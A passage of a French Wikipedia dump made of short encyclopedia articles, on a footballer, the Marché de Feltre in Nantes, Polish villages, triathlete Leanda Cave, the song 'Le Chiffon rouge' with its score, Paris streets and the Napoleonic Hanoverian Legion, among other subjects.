Dugimont fait ses débuts auxerrois le , remplaçant Romain Philippoteaux contre Nancy en Ligue 2. Il inscrit son premier but au mois d'octobre 2018 lors d'une défaite 3-2 aux dépens de l'OGC Nice en Coupe de la Ligue. Dugimont vit un exercice difficile, à l'image de son club, et marque à quatre reprises en championnat alors qu'il avait clôturé les deux saisons précédentes avec plus de dix buts.
Le 21 août 2022 il fait ses débuts en Ligue 1 à l'âge de 36 ans, avec à la clé une passe décisive.

</doc>
<doc id="8728400" url="https://fr.wikipedia.org/wiki?curid=8728400" title="Vingt ans (homonymie)">
Vingt ans (homonymie)

Le terme Vingt ans, ou 20 ans, peut faire référence à un âge ou à une période. Il est utilisé dans plusieurs œuvres.

</doc>
<doc id="8728406" url="https://fr.wikipedia.org/wiki?curid=8728406" title="20 ans">
20 ans



</doc>
<doc id="8728422" url="https://fr.wikipedia.org/wiki?curid=8728422" title="Marché de Feltre">
Marché de Feltre

Le marché de Feltre est un ancien marché couvert situé à Nantes dans le centre-ville. Inauguré en 1902, il remplace une ancienne halle aux toiles construite par Mathurin Crucy qui abrita le premier musée des beaux-arts de la ville.
Localisation.
Le marché se trouve à proximité immédiate du chevet de la basilique Saint-Nicolas dont il est séparé sur son côté sud par la rue de Feltre. Il est encadré à l'ouest par la rue de l'Arche-Sèche située en contrebas et par la rue Cacault qui la borde à l'est. Au nord, le bâtiment est longé par la rue des Deux-Ponts, à proximité des vestiges de la porte Sauvetout.
Histoire.
La halle aux toiles.
En 1819, François-Jean-Baptiste Ogée, ancien architecte conservateur
des bâtiments civils du département de la Loire-Inférieure et architecte de la Ville de Nantes, programme la construction d'une halle aux toiles, sur les anciens terrains des fossés Saint-Nicolas, devant contenir environ trente boutiques, ainsi que le bureau de l’inspecteur de la marque. Il confie cependant le chantier à Mathurin Peccot, architecte-voyer honoraire, qui imagine un plan en fer à cheval. L'oncle de ce dernier, Mathurin Crucy, se propose d’édifier un bâtiment constitué de deux étages : un marché pour les fruits et légumes au rez-de-chaussée ; une halle aux toiles au-dessus, dans laquelle seront vendus hebdomadairement des lins, fils et tissus divers. Mais Crucy voit son premier projet rejeté par le conseil municipal. Après de nombreuses modifications notamment en matière de contraintes de style imposées par Gourlier, rapporteur au conseil des bâtiments civils, son deuxième plan est finalement accepté en 1821, et l'édifice est construit en 1823.
Le chantier nécessite le nivellement d'une tranche de la motte Saint-Nicolas. À l'angle sud-ouest du bâtiment, on édifia en 1835 un pont permettant à la rue du Calvaire qui fut prolongée, de pouvoir franchir la rue de l’Arche-Sèche en direction du pont de l’Écluse (située à l'emplacement de l'actuelle place de l'Écluse). Ce pont est baptisé « pont de l'Érail ». La nouvelle rue prend alors le nom de « rue de l'Érail ». Le résultat est commenté en 1826 dans L'Ami de la Charte : .
Le bâtiment de Crucy est d’ordre dorique présentant une addition de modillons dans une corniche. Sa longueur est d’environ pour une largeur d’à peu près . Le rez-de-chaussée, adossé contre le monticule de la rue de la Boucherie, sur le bord duquel il est en partie construit, s’ouvre de l’autre côté (le long de la rue de l’Arche-Sèche), par une galerie à 19 portiques arrondis ouvrant sur une vaste place enclose cernée par des pavillons et des appentis en bois qui permettent aussi bien aux marchandes de légumes qu'aux acheteurs d'être à l’abri des intempéries. Tout le premier étage, hormis l'espace réservé aux bureaux et au logement du directeur, forme une salle immense, éclairée par trente-six croisées cintrées à impostes d’archivoltes.
En 1829, le premier étage est aménagé pour recevoir le musée de peinture, constitué par la collection de tableaux et de sculptures achetée en 1810 par l'ancien maire de Nantes Jean-Baptiste Bertrand-Geslin, à Pierre Cacault qui l'avait reçue de son frère François, mort en 1805, complétée par les œuvres données à la ville par . Selon un inventaire effectué en 1818, la collection Cacault était alors la plus riche collection de tableaux qui existait en France en dehors de Paris puisqu'elle comptait : peintures, 64 sculptures et 134 recueils d'estampes.
Ogée est alors désigné pour établir le devis des travaux nécessaires à l’aménagement. Ceux-ci consistent notamment à séparer la partie halle de la partie musée, laquelle sera cloisonnée en quatre salles. Le musée est inauguré le . Cependant, les quatre salles ne suffisent pas à héberger toutes la collection, ce qui contraint la ville à vendre environ 400 de ses œuvres en 1831. Mais néanmoins, le musée gagne de l'espace sur la halle : une nouvelle salle est inaugurée en 1833, une deuxième quelques années plus tard, une dernière en 1846, achevant l’occupation complète de l’étage. En 1852, des travaux de décoration sont effectués pour accueillir le legs de la collection d'Edgar Clarke, duc de Feltre, et de son frère Alphonse, conformément aux exigences du testament. La salle est inaugurée le . La « rue de l'Érail » sera alors baptisée « rue de Feltre » en leur honneur.
En 1860, les administrateurs du musée obtiennent la réfection des autres salles du premier étage. La façade de la rue Cacault est rénovée en 1865, tandis que le nivellement et les alignements des voies aux abords du musée sont réalisés en 1867. Mais le musée de Feltre reste trop exigu. En 1864, Philbert Doré, porte-parole de la commission de surveillance du musée, écrit au maire pour lui demander l’agrandissement d'urgence de l’établissement et lui signifier son inquiétude devant l’augmentation du nombre des toiles non exposées. Le préfet constate même « l’insuffisance du bâtiment affecté au service du musée de peinture », encourageant le maire à envisager sérieusement l’agrandissement du bâtiment. Un projet est alors proposé en 1866, consistant à doubler la superficie du musée existant par la construction d'une aile parallèle de mêmes dimensions. Le projet ne verra pas le jour, si bien que vingt ans plus tard, en 1887, Philbert Doré constate que « la construction prochaine d’un plus vaste musée s’impose impérieusement. » Il faudra attendre 1891 pour que la ville se décide enfin à construire un édifice spécialement conçu pour conserver et présenter au public des œuvres d'art dans de bonnes conditions. Le musée des beaux-arts de Nantes sera inauguré quelques années plus tard à proximité de l'actuel lycée Georges-Clemenceau et du jardin des plantes.
Le nouveau marché.
Le bâtiment de Crucy devenu vacant, reprend pour quelques années sa vocation de marché couvert. Celui-ci sera finalement rasé pour laisser la place à l'édifice actuel conçu par l'architecte Alfred Marchand. Celui-ci s'expose sous la forme de deux façades à fronton en pierre blanche au nord et au sud, tandis que les murs latéraux présentent des arcades en fonte et un appareillage de briques rouges. Le nouveau marché couvert sera inauguré en 1902.
Endommagé par les bombardements de 1943 durant la Seconde Guerre mondiale qui ravagent la rue du Calvaire, le marché de Feltre abrite dès les années 1950, une fabrique de glaces qui approvisionne les habitants du centre-ville alors dépourvus de réfrigérateur. En 1964, la municipalité dénonce le bail la liant à la société « Frigo nantais » exploitant le frigorifique dans le bâtiment. En , cette société propose alors à la ville d’aménager et exploiter une patinoire dans l'ancien marché. Le conseil municipal du de la même année accepte la proposition permettant « de mettre un terme au contentieux engagé, sans qu’il en résulte aucune charge pour la commune », tout en reconnaissant qu'une telle installation faisait défaut dans l'agglomération nantaise. La patinoire, qui est inaugurée en 1967, ne fonctionna d'abord qu'en hiver, puis au gré de l'amélioration des installations, sera ouverte toute l'année. Mais, l'équipement se révèle rapidement inadapté pour la pratique du sport de haut niveau. La ville décide donc dans les années 1980 la construction du centre de loisirs du Petit Port qui sera doté d'une patinoire adéquate.
Devenu de nouveau vacant le marché de Feltre, retrouve sa vocation commerciale en accueillant deux magasins : l'un au rez-de-chaussée, à l'enseigne C&amp;A et l'autre, à l'étage, le "Forum du Livre" (devenue ensuite la librairie « Chapitre »). Dans cet objectif, le bâtiment fera enfin l'objet de travaux d'extension devant l'entrée principale, ainsi que d'un aménagement intérieur.

</doc>
<doc id="8728425" url="https://fr.wikipedia.org/wiki?curid=8728425" title="Garbatka (Grande-Pologne)">
Garbatka (Grande-Pologne)

Garbatka (prononciation : ) est un village polonais de la gmina de Rogoźno dans le powiat d'Oborniki de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-ouest de Rogoźno (siège de la "gmina"), à au nord-est d'Oborniki (siège du powiat), et à au nord de Poznań (capitale de la Grande-Pologne).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Piła.&lt;br&gt;
Depuis 1999, Garbatka est situé dans la voïvodie de Grande-Pologne.
Le village possède une population de .

</doc>
<doc id="8728431" url="https://fr.wikipedia.org/wiki?curid=8728431" title="Leanda Cave">
Leanda Cave

Leanda Cave née le à Louth en Angleterre est un triathlète professionnelle britannique. Quadruple championne du monde de triathlon. Championne du monde courte distance (M) en 2002, longue distance (XL) en 2007, championne du monde Ironman et d'Ironman 70.3 en 2012. Elle la première triathlète féminine à remporter les deux titres Ironman la même année.
Biographie.
Jeunesse.
À l'âge de quatre ans, ses parents s'installent au Queensland, en Australie pour des raisons professionnelles. De retour en Angleterre, sa mère étant galloise, elle choisit de représenter le Pays de Galles.
Carrière en triathlon.
Leanda Cave fait ses débuts au triathlon en 1994 et devient professionnelle en 2000. Elle commence sa carrière internationale en remportant le titre de champion d'Europe U23 (espoir) en 2001. En 2002 elle participe en catégorie élite aux Jeux du Commonwealth à Manchester et prend la deuxième place au championnat d'Europe. En novembre de cette même année au Mexique elle remporte le titre mondial sur distance M décerné par la Fédération internationale de triathlon (IUT). Elle est nommée pour la personnalité sportive galloise de l'année. Blessée en 2003 elle ne pourra défendre son titre mondial en 2003.
Elle remporte son deuxième titre mondial en 2007 en remportant les Championnats du monde de triathlon longue distance (XL) organisé par l'IUT qui se déroule à Lorient en France. En 2008 elle participe au circuit Ironman 70.3 et devient vice-championne du monde. En 2012, elle remporte son premier Ironman en Arizona aux États-Unis. Le , elle remporte le championnat du monde Ironman 70.3 et le , le championnat du monde Ironman à Kailua-Kona. À environ cinq kilomètres de l'arrivée, elle dépasse la Suissesse Caroline Steffen qui tient la tête de course depuis le départ et s'impose seule sur la ligne d'arrivée. En remportant le championnat du monde d'Ironman et d'Ironman 70.3 la même année, elle devient la première femme à réaliser ce « doublé ». C'est le triathlète australien Craig Alexander qui réalise cet exploit chez les hommes en 2011. Pour la réalisation de cet exploit elle est consacrée "World's fittest women" de l'année 2012 par la chaine CNN.
En 2014 elle se concentre sur les compétitions de courtes distances dans le but de faire partie de l'équipe de Galles aux Jeux du Commonwealth, mais malgré quelques bons résultats, elle ne se qualifie pas pour ces compétitions. Elle remporte par la suite l'Ironman Suède terminant avec les meilleurs temps dans les trois disciplines.
Vie privée.
En , ses médecins lui diagnostiquent un cancer de la peau. Malgré les risques pour son état de santé, elle prend le départ des deux compétitions Ironman pour défendre ses titres de championne du monde, mais termine dans les deux championnats.
Elle rencontre le triathlète allemand Torsten Abel en 1999 au Portugal. Ils se marient à l'été 2010, et déménagent à Tucson, en Arizona. Le couple est actuellement séparé.
Palmarès.
Le tableau présente les résultats les plus significatifs (podium) obtenus sur le circuit international de triathlon depuis 2002.

</doc>
<doc id="8728442" url="https://fr.wikipedia.org/wiki?curid=8728442" title="Gościejewo (Grande-Pologne)">
Gościejewo (Grande-Pologne)

Gościejewo (prononciation : ) est un village polonais de la gmina de Rogoźno dans le powiat d'Oborniki de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord-ouest de Rogoźno (siège de la "gmina"), à au nord-est d'Oborniki (siège du powiat), et à au nord de Poznań (capitale de la Grande-Pologne).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Piła.&lt;br&gt;
Depuis 1999, Gościejewo est situé dans la voïvodie de Grande-Pologne.
Le village possède une population de en 2012.

</doc>
<doc id="8728469" url="https://fr.wikipedia.org/wiki?curid=8728469" title="Liste des maires de Trois-Rivières">
Liste des maires de Trois-Rivières

Liste des maires de Trois-Rivières, à cette liste des maires de l'ancienne ville de Trois-Rivières (avant 2002), s'ajoute la liste des maires des anciennes villes de Cap-de-la-Madeleine, Sainte-Marthe-du-Cap, Saint-Louis-de-France, Trois-Rivières-Ouest et Pointe-du-Lac. Toutes ces anciennes villes ont été fusionnées en 2002 pour former la nouvelle ville de Trois-Rivières.

</doc>
<doc id="8728476" url="https://fr.wikipedia.org/wiki?curid=8728476" title="Place Stalingrad (Paris)">
Place Stalingrad (Paris)



</doc>
<doc id="8728479" url="https://fr.wikipedia.org/wiki?curid=8728479" title="Rue des Sept-Voies">
Rue des Sept-Voies



</doc>
<doc id="8728480" url="https://fr.wikipedia.org/wiki?curid=8728480" title="The Testament of Sister New Devil">
The Testament of Sister New Devil

 est une série de "" écrite par Tetsuto Uesu et illustrée par Nekosuke Ōkuma. Elle est publiée entre 2012 et 2018 par l'éditeur Kadokawa Shoten et douze tomes sont commercialisés. Une première adaptation en manga par Kashiwa Miyako est publiée entre 2013 et 2017 dans le magazine "Monthly Shōnen Ace", et une seconde par Tetsuto Uesu entre 2014 et 2016 dans le magazine "Young Animal Arashi". Une adaptation en série télévisée d'animation produite par le studio Production IMS est diffusée initialement entre janvier et sur Tokyo MX au Japon et en simulcast par Crunchyroll dans les pays francophones. Une seconde saison est diffusée entre octobre et .
Synopsis.
L’histoire nous entraîne dans le quotidien ecchi de Toujo Basara, qui se retrouve à vivre avec deux belles-sœurs, à la suite du remariage de son père. Cependant, les sœurs Mio et Maria, sont en réalité de jeunes Démons. L’une est la Démon-Reine et l’autre un succube. Mais Basara fait partie du clan des Héros, qui est l’ennemi naturel des Démons. Et un incident conduit Basara au rang de Maître de Mio. Malheureusement, la vie de l’adolescent est loin d’être de tout repos puisque Mio est poursuivie par les autres tribus de Démons et les clans des Héros.
Light novel.
La série de "" est écrite par Tetsuto Uesu avec des illustrations de Nekosuke Ōkuma. Le premier tome est publié le . La série compte un total de douze tomes principaux et deux tomes bonus nommés "Light!" et "Sweet!".
Manga.
Une adaptation en manga dessinée par Kashiwa Miyako est prépubliée à partir du dans le magazine "Monthly Shōnen Ace". Le premier volume relié est publié le et la série comporte un total de neuf tomes. La version française est publiée par Delcourt à partir de .
Un second manga, intitulé et dessiné par Fumihiro Kiso, est prépublié à partir du dans le magazine "Young Animal Arashi". Le premier volume relié est publié par Hakusensha le et la série compte un total de cinq tomes. La série est publiée en France par Delcourt depuis le .
Anime.
L'adaptation en série télévisée d'animation est annoncée en mars 2014 dans le magazine "Monthly Dragon Age". Celle-ci est produite au sein du studio Production IMS avec une réalisation de Hisashi Saito et un scénario de Takao Yoshioka. Elle est diffusée initialement à partir du sur Tokyo MX. Un épisode OVA est sorti avec le huitième "" commercialisé en .
Une seconde saison est annoncée en . Intitulée "BURST", celle-ci est diffusée du au . Un épisode OAV est ensuite commercialisé. Un nouvel OAV est prévu pour .
Dans les pays francophones, la série est diffusée en simulcast par Crunchyroll.

</doc>
<doc id="8728481" url="https://fr.wikipedia.org/wiki?curid=8728481" title="Shinmai Maō no Tesutamento">
Shinmai Maō no Tesutamento



</doc>
<doc id="8728487" url="https://fr.wikipedia.org/wiki?curid=8728487" title="Le Bien Public (journal belge)">
Le Bien Public (journal belge)



</doc>
<doc id="8728494" url="https://fr.wikipedia.org/wiki?curid=8728494" title="Rue des Fossés-Saint-Martin">
Rue des Fossés-Saint-Martin

La rue des Fossés-Saint-Martin peut désigner deux voies de Paris :
Ces deux voies ont été également nommées par le passé chemin de la Voirie, en référence aux voiries de Paris.

</doc>
<doc id="8728495" url="https://fr.wikipedia.org/wiki?curid=8728495" title="Rue Basse-Porte-Saint-Martin">
Rue Basse-Porte-Saint-Martin



</doc>
<doc id="8728498" url="https://fr.wikipedia.org/wiki?curid=8728498" title="Le Chiffon rouge">
Le Chiffon rouge

Le Chiffon rouge est une chanson revendicative écrite en 1977 par Maurice Vidalin, mise en musique et chantée par Michel Fugain.
Historique.
Elle est créée le au Havre dans le cadre du programme « Juin dans la rue, mois de la jeunesse ».
Elle est populaire dans les luttes sociales jusque dans les années 1980 et sert notamment d'indicatif à la radio Lorraine cœur d'acier.
Mélodie.
&lt;score sound="1"&gt;
\chords { \set ChordNames.midiMaximumVolume = #0.65
 g,1*2 d,1:7 g,1*3 d,1:7 g,
 c:/g g, a,2:m d,:7 g,1
 c:m/g g, c2 a,:m7 d1
 g,1*3 a,1*2:m7/e d,1*2:7 g,1*3
 g,2 d,:7 g,1
\new Voice = "default" {
 \key g \major \time 4/4 \relative c" {
 g8. a16 b8. ais16 b2 g8. a16 b8. ais16 b8 c b g
 fis8. g16 a8. gis16 a4. b8 g1
 g8. a16 b8. ais16 b2 g8. a16 b8. ais16 b8 c b g
 fis8. g16 a8. gis16 a4. b8 g2. 8. c16
 e8. dis16 e4~ 8. dis16 e8. cis16 d8.( cis16) d2 b8. 16
 a8. gis16 a8. b16 c8. b16 c8. d16 b2. g8. c16
 ees8. d16 ees4~ 8. d16 ees8. c16 d4 g,2 8. 16
 c4 8. 16 4 b8. d16 a2. d,8. g16 \bar "||"
 b4 8. c16 b8 8 d,8. g16 b4 8. c16 b4 d,8. g16 
 b4 8. c16 d4 c8. b16 a4 8. b16 e,2
 a4 8. b16 d4. b8 a4 8. b16 d,2
 a'4 8. b16 d4 b8. a16 g4 8. b16 d,4 d8. g16
 b4 8. c16 b4 d,8. g16 b4 8. c16 b4 d,8. g16
 b4 g8. b16 d4 c8. a16 g1 \bar ":|."
\new Lyrics \lyricsto "default" {
 \set stanza = "1."
 Ac -- cro -- che_à ton cœur un mor -- ceau de chif -- fon rou -- ge,
 u -- ne fleur cou -- leur de sang.
 Si tu veux vrai -- ment que ça chan -- ge_et que ça bou -- ge,
 lè -- ve -- toi car il est temps.
 Al -- lons droit de -- vant vers la lu -- miè -- re
 en le -- vant le poing et en ser -- rant les dents,
 Nous ré -- veil -- le -- rons la ter -- re_en -- tiè -- re
 et de -- main, nos ma -- tins chan -- te -- "ront :"
 \set stanza = "R."
 Com -- pa -- gnon de co -- lè -- re, com -- pa -- gnon de com -- bat,
 toi que l’on fai -- sait taire, toi qui ne comp -- tais pas,
 Tu vas pou -- voir en -- fin le por -- ter,
 le chif -- fon rou -- ge de la li -- ber -- té,
 Car le mon -- de se -- ra ce que tu le fe -- ras,
 plein d’a -- mour, de jus -- tice et de "joie !"
»
&lt;/score&gt;

</doc>
<doc id="8728506" url="https://fr.wikipedia.org/wiki?curid=8728506" title="Greetings from L.A.">
Greetings from L.A.

Greetings from L.A. est un album de Tim Buckley, sorti en 1972.
L'album.
Il fait partie des 1001 albums qu'il faut avoir écoutés dans sa vie. 
Titres.
Tous les titres sont de Tim Buckley, sauf mentions. 

</doc>
<doc id="8728507" url="https://fr.wikipedia.org/wiki?curid=8728507" title="Place Vaugirard">
Place Vaugirard



</doc>
<doc id="8728509" url="https://fr.wikipedia.org/wiki?curid=8728509" title="Avenue Victor-Emmanuel III">
Avenue Victor-Emmanuel III



</doc>
<doc id="8728511" url="https://fr.wikipedia.org/wiki?curid=8728511" title="Chemin de la Voirie">
Chemin de la Voirie



</doc>
<doc id="8728516" url="https://fr.wikipedia.org/wiki?curid=8728516" title="Life is Strange">
Life is Strange



</doc>
<doc id="8728522" url="https://fr.wikipedia.org/wiki?curid=8728522" title="Goce Georgievski">
Goce Georgievski

Goce Georgievski, né le à Skopje, est un joueur de handball macédonien évoluant au poste d'ailier droit.

</doc>
<doc id="8728523" url="https://fr.wikipedia.org/wiki?curid=8728523" title="Ruelle du four Saint-Martin-des-Champs">
Ruelle du four Saint-Martin-des-Champs

La ruelle du four Saint-Martin-des-Champs est une ancienne rue de Paris, aujourd'hui disparue, qui était située dans le quartier des Halles.
Origine du nom.
Ce nom est dû à la présence du four situé fief de la Rapée, dont jouissait le prieuré Saint-Martin-des-Champs en 1119, et qui était attenant à la ruelle.

</doc>
<doc id="8728541" url="https://fr.wikipedia.org/wiki?curid=8728541" title="Porebrice">
Porebrice

Porebrice peut désigner 2 localités de Bosnie-Herzégovine qui constituaient une seule et même entité avant la guerre de Bosnie-Herzégovine :

</doc>
<doc id="8728554" url="https://fr.wikipedia.org/wiki?curid=8728554" title="Le Léopard de la jungle noire">
Le Léopard de la jungle noire

Le Léopard de la jungle noire (titre original : "Sandokan contro il leopardo di Sarawak") est un film italo-allemand de Luigi Capuano sorti en 1964. Il fait suite au "Trésor de Malaisie".
Liens externes.
 

</doc>
<doc id="8728555" url="https://fr.wikipedia.org/wiki?curid=8728555" title="Le Pirate de Malaisie">
Le Pirate de Malaisie



</doc>
<doc id="8728561" url="https://fr.wikipedia.org/wiki?curid=8728561" title="Le Moussaillon">
Le Moussaillon

Le Moussaillon est un film français réalisé par Jean Gourguet et sorti en 1942.

</doc>
<doc id="8728562" url="https://fr.wikipedia.org/wiki?curid=8728562" title="Gonzalo Carou">
Gonzalo Carou

Gonzalo Matias Carou, né le , est un joueur international argentin de handball, évoluant au poste de pivot au sein du club du Club Balonmano Ademar León et en équipe d'Argentine.
Il détient le record de participation au record de participation au Championnat du monde avec onze compétitions disputées entre 2001 et 2021.
Biographie.
Alors qu'il évolue à River Plate, il est sélectionné à seulement 21 ans pour participer au Championnat du monde 2001.
La même année, il rejoint l'Espagne et le JD Arrate où il évolue jusqu'en 2008, date de son transfert au CB Ademar León. En 2014, il quitte León pour rejoindre Istres, mais y retourne la saison suivante après la relégation du club istréen.
Avec l'équipe d'Argentine, il participe notamment aux Jeux olympiques de Londres en 2012.
Liens externes.
 

</doc>
<doc id="8728568" url="https://fr.wikipedia.org/wiki?curid=8728568" title="Joey Richter">
Joey Richter

Joseph Michael "Joey" Richter, né le en Californie, est un acteur américain. 
Il a étudié à l'Université du Michigan, à Ann Arbor, et en sort avec un Bachelor of Fine Arts en 2011.
Il s'est fait connaître dans les comédies musicales de Starkid, dans lesquelles il a tenu des rôles principaux. Il a interprété le rôle de Ron Weasley dans "A Very Potter Musical", "A Very Potter Sequel" et "A Very Potter Senior Year". Ces comédies musicales parodiques, publiées sur YouTube, se passent dans le monde de Harry Potter : les deux premières comptent plusieurs millions de vue.
Il a également tenu le rôle principal de Bug, un insecte, dans la comédie musicale "Starship", de Starkid ainsi que le Bouffon du Temps dans Henry Danger. Elle comptabilise également plusieurs millions de vues sur Youtube. En 2009, il a aussi tenu un rôle principal, dans "Me and My Dick" : son personnage s'appelait Joey.
Il joue également dans la série télévisée "Jessie"".

</doc>
<doc id="8728581" url="https://fr.wikipedia.org/wiki?curid=8728581" title="Mont Ishikari">
Mont Ishikari

Le est une montagne du Japon, sur l'île de Hokkaidō. Il fait partie du parc national de Daisetsuzan, et est la source du fleuve Ishikari.

</doc>
<doc id="8728587" url="https://fr.wikipedia.org/wiki?curid=8728587" title="Ondřej Zdráhala">
Ondřej Zdráhala

Ondřej Zdráhala (né le ), est un joueur de handball tchèque. Il joue au poste de demi-centre en équipe nationale de République tchèque et dans le club polonais du Wisła Płock.

</doc>
<doc id="8728592" url="https://fr.wikipedia.org/wiki?curid=8728592" title="Rue des Mariettes">
Rue des Mariettes



</doc>
<doc id="8728593" url="https://fr.wikipedia.org/wiki?curid=8728593" title="Rue des Marionnettes">
Rue des Marionnettes

La rue (ou ruelle) des Marionnettes est une ancienne voie du .
Situation et accès.
La rue est un cul-de-sac qui part du 277 rue Saint-Jacques. Elle longe, à droite, l'ancienne abbaye du Val-de-Grâce et l'actuel hôpital d'instruction des armées du Val-de-Grâce, et à gauche, l'ancien couvent des Bénédictins anglais, l'actuelle Scola Cantorum, et des habitations donnant sur la rue des Feuillantines et la rue Claude-Bernard, dont une chapelle qui appartenait soit à l'ancien couvent des Feuillantines, soit au couvent des Filles de la Providence. Elle se termine par un mur qui donne sur un ancien hôtel particulier de la rue Berthollet, ayant appartenu à la famille Lefort-Latour, ancien directeur des Fermes du roi.
Origine du nom.
Elle s'est appelée rue des Mariollets, en référence à la statue d'un marmouset.
Historique.
Elle est très pittoresque : bornes chasse-roue et puits et a peu changé depuis le . Autrefois, elle reliait la rue Saint-Jacques et la rue de l'Arbalète. Elle a été fermée du côté rue de l'Arbalète en 1688 à la demande des religieuses voisines de l'abbaye du Val-de-Grace en raison des dépôts d'immondices et de la présence de prostituées et de brigands.

</doc>
<doc id="8728594" url="https://fr.wikipedia.org/wiki?curid=8728594" title="Rue des Marmouzets">
Rue des Marmouzets



</doc>
<doc id="8728595" url="https://fr.wikipedia.org/wiki?curid=8728595" title="Manoir de Chiffretot">
Manoir de Chiffretot

Le manoir de Chiffretot est un édifice du situé aux Moutiers-Hubert, dans le département du Calvados en région Normandie. Il fait l'objet d'une inscription au titre des monuments historiques depuis le .
Localisation.
Le manoir de Chiffretot se situe sur le territoire de la commune des Moutiers-Hubert, à l'est du département du Calvados, dans la région naturelle du pays d'Auge. Il se trouve au sud du bourg, sur les bords de la Touques et à environ au sud-ouest de l'église Saint-Martin.
Historique.
Le manoir a été réquisitionné par le maréchal Rommel pendant le débarquement allié et la bataille de Normandie en 1944. C'est à quelques kilomètres de là (à proximité de Vimoutiers) qu'il a été blessé par une attaque aérienne lors d'un déplacement en automobile. Son état-major avait réquisitionné une maison du village qui avait autrefois servi d'hôtellerie aux représentants de commerce de la "Fabrique de papiers d'emballage", disparue dans un incendie accidentel en 1928.
Le manoir a eu pour propriétaire Robert Halley, créateur du groupe Promodès et maire du village de 1978 à 2001.
Architecture.
Le manoir de Chiffretot est composé de deux éléments bien distincts :
Par ailleurs, dans le parc entourant le manoir, se dresse un colombier carré en pierre de taille qui porte la date de 1605.
Protection.
Le manoir et son colombier sont inscrits au titre des monuments historiques depuis le .

</doc>
<doc id="8728597" url="https://fr.wikipedia.org/wiki?curid=8728597" title="Jal (Kazakhstan)">
Jal (Kazakhstan)

Le Jal est un plat de la cuisine kazakhe à base de gras de cou de cheval. 
Le Jal est la couche de graisse sous la crinière du cheval et on ne le sert qu'aux invités honorés car c'est un ingrédient très rare.

</doc>
<doc id="8728605" url="https://fr.wikipedia.org/wiki?curid=8728605" title="Nyoshül Khenpo Rinpoché">
Nyoshül Khenpo Rinpoché

Nyoshul Khenpo Rinpoché (- en Dordogne), aussi Nyoshul Khenpo Jamyang Dorje (), est un lama tibétain né dans la région de Derge du Kham. 
Biographie.
Nyoshul Khenpo Rinpoche est né en 1932 dans la région de Derge, Kham, Tibet. À l'âge de cinq ans, il a rejoint un monastère Sakya, où il a commencé ses études bouddhistes. À dix-sept ans, il a étudié les enseignements du "Longchen Nyingthik" et Dzogchen au monastère de Nyoshul. Au moment du soulèvement tibétain de 1959, quand il avait vingt-sept ans, sous le feu des Chinois, il s'est enfui en Inde avec 70 personnes, mais seulement cinq arrivèrent. 
En Inde, il a étudié sous la direction de Jigdral Yeshe Dorje ( Kyabjé Dudjom Rinpoché), Dilgo Khyentse Rinpoché, et le Karmapa (Rangjung Rigpe Dorje).
Parmi ses étudiants, se trouvent et Sogyal Rinpoché.
Il est mort le à Antamnies en Dordogne où il est resté quelques jours en méditation post-mortem de thukdam.
Liens externes.
 
 

</doc>
<doc id="8728612" url="https://fr.wikipedia.org/wiki?curid=8728612" title="Légion hanovrienne">
Légion hanovrienne

La Légion hanovrienne est un corps militaire créé en 1803 par Napoléon Bonaparte dans l'électorat du Hanovre. Son organisation s'étale sur deux ans, jusqu'en 1805, en raison de la difficulté du recrutement. La légion part pour la France en 1804 ; elle entre ensuite dans la péninsule Ibérique dans le cadre de la guerre d'Espagne, où elle se bat essentiellement au Portugal au sein des troupes de Junot, Soult et Masséna. Elle se distingue une dernière fois à Fuentes de Oñoro en , avant d'être dissoute et ses éléments éparpillés dans les unités françaises.
Organisation.
En 1803, les troupes françaises du général Édouard Mortier occupent l'électorat du Hanovre, possession de la famille royale britannique. Le Premier consul Napoléon Bonaparte en profite pour ordonner l'organisation d'une légion hanovrienne combinant une unité de cavalerie et un régiment d'infanterie légère. La légion est officiellement créée par le général Mortier le . Un dépôt est installé à Celle pour y recevoir les recrues. Les prescriptions de Napoléon doivent cependant être revues à la baisse : en effet, la plupart des soldats de l'ex-armée hanovrienne se sont réfugiés en Angleterre pour s'enrôler dans la King's German Legion, ce qui oblige l'administration à faire appel à des volontaires allemands. En dépit de ces efforts, l'infanterie de la légion n'aligne qu'un demi-bataillon sur les deux prévus initialement. Seule la cavalerie rassemble un effectif suffisant pour devenir le "régiment de chevau-légers hanovriens".
Campagnes militaires.
Infanterie.
Au milieu de l'année 1804, Napoléon ordonne le transfert de la légion hanovrienne en France, espérant ainsi limiter les désertions. Parti d'Allemagne en octobre, cette dernière arrive à Avignon en . Un peu plus tard dans l'année, le bataillon d'infanterie hanovrien est présent lors de la visite du pape Pie VII à Lyon, au cours de laquelle, sur ordre du général de Ségur, il doit intervenir pour contenir un mouvement de foule. L'unité est ensuite assignée à la garde des côtes françaises de Méditerranée et de l'Atlantique, avant d'être incorporée au corps d'observation de la Gironde du général Junot en . Ce dernier envahit peu après le Portugal et s'empare de Lisbonne à la fin du mois de novembre. À la date du , les fantassins hanovriens servent à la brigade du général Fuzier, appartenant à la division du général Travot. 
Vaincues par l'armée britannique du général Wellesley, les troupes de Junot sont rapatriées en France par la marine britannique ; la plupart des Hanovriens servant dans la légion en profitent alors pour déserter et rejoindre les rangs de la King's German Legion. La légion revient en Espagne l'année suivante, toujours au sein du corps de Junot, dans le cadre de la venue de l'Empereur dans la péninsule ; avec un effectif qui ne dépasse pas 300 soldats, elle passe ensuite dans le corps du maréchal Soult et prend part aux opérations contre l'armée britannique du général Moore. À la fin de l'année, réduit comme peau de chagrin par les combats, le bataillon hanovrien est intégré au corps du maréchal Ney.
En 1810, la légion est dotée d'un second bataillon grâce aux renforts en provenance des dépôts et de l'ex-bataillon de Westphalie. Engagée dans la troisième invasion française du Portugal dirigée par le maréchal Masséna, les Hanovriens font le coup de feu aux sièges de Ciudad Rodrigo et d'Almeida, puis à la bataille de Buçaco où les Anglo-Portugais, solidement retranchés, leur infligent de lourdes pertes. Après l'échec de la campagne, la légion, à présent réduite à environ 600 hommes, se bat à Fuentes de Oñoro du 3 au . Au cours de l'action, le bataillon hanovrien est confondu avec une unité britannique par les soldats français à cause de son uniforme rouge et essuie le feu ami. Les pertes subies lors de la bataille entraîne la dissolution de la légion hanovrienne le . Ses membres sont alors dispersés dans des régiments français à fort caractère germanophone, à savoir les et régiments étrangers et les , et régiments d'infanterie de ligne.
Cavalerie.
